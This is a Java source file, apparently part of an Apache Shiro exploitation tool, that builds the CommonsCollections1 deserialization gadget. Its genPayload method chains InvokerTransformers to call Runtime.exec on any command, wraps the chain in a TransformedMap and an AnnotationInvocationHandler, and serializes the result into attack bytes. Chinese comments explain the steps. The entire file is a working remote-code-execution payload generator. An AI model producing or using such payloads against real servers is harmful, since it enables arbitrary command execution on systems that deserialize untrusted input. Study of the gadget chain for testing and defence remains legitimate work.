package com.y5neko.shiroexp.gadget;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static byte[] genPayload(String cmd) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        // 提取执行命令
        String[] cmd_array = cmd.split(" ");
        // 制作反射执行exec的chainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd_array})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //创建一个TransformedMap对象，并与chainedTransformer绑定
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","test value");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        //反射获取AnnotationInvocationHandler类，并通过构造方法实例化对象
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        oos.close();
        return baos.toByteArray();
    }
}
